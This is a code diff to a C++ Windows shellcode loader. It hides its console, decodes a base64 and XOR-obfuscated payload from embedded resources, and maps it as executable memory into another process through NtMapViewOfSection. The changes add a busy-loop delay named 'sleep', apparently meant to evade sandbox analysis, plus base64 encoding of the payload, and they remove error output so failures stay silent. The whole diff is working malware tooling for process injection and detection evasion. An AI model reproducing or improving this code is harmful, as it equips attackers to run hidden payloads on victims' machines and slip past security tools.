@@ -1,15 +1,18 @@
 ﻿#include <iostream>
+#include <Windows.h>
 #include <string>
 #include "ntdll.h"
+#include "base64.h"
 #include "resource.h"
 
-
-void checkNtStatus(const NTSTATUS status);
+void sleep();
+void checkNtStatus(NTSTATUS status);
 const std::string loadPayload();
 
 int main(int argc, char** argv)
 {
 	ShowWindow(GetConsoleWindow(), SW_HIDE);
+	sleep();
 
 	HMODULE ntdll = LoadLibrary(TEXT("ntdll.dll"));
 	if (ntdll == NULL)
@@ -41,7 +44,7 @@ int main(int argc, char** argv)
 	status = NtMapViewOfSection(section, currentProcess, &localSection, NULL, NULL, NULL, (PULONG)&size, ViewUnmap, NULL, PAGE_READWRITE);
 	checkNtStatus(status);
 
-	targetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 26956);
+	targetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 17464);
 
 	status = NtMapViewOfSection(section, targetProcess, &targetSection, NULL, NULL, NULL, (PULONG)&size, ViewUnmap, NULL, PAGE_EXECUTE_READ);
 	checkNtStatus(status);
@@ -72,10 +75,24 @@ int main(int argc, char** argv)
 	return 0;
 }
 
+void sleep()
+{
+	for (int i = 0; i <= 333333; i++)
+	{
+		for (int j = 2; j <= i / 2; j++)
+		{
+			if (i % j == 0)
+			{
+				break;
+			}
+		}
+	}
+}
+
 void checkNtStatus(NTSTATUS status)
 {
-	if (!NT_SUCCESS(status)) {
-		printf("Failed in calling NtAllocateVirtualMemory(). Error code: 0x%16x\n", status);
+	if (!NT_SUCCESS(status))
+	{
 		exit(1);
 	}
 }
@@ -88,9 +105,10 @@ const std::string loadPayload()
 	char* key = (char*)LockResource(keyResourceHandle);
 
 	HRSRC obfuscatedPayloadResource = FindResource(NULL, MAKEINTRESOURCE(IDR_OBFUSCATEDPAYLOAD1), L"obfuscatedPayload");
-	DWORD obfuscatedPayloadSize = SizeofResource(NULL, obfuscatedPayloadResource);
 	HGLOBAL obfuscatedPayloadResourceHandle = LoadResource(NULL, obfuscatedPayloadResource);
-	char* obfuscatedPayload = (char*)LockResource(obfuscatedPayloadResourceHandle);
+	char* encodedObfuscatedPayload = (char*)LockResource(obfuscatedPayloadResourceHandle);
+	const std::string obfuscatedPayload = base64_decode(encodedObfuscatedPayload);
+	size_t obfuscatedPayloadSize = obfuscatedPayload.size();
 	std::string payload = "";
 
 	int keyIndex = 0;
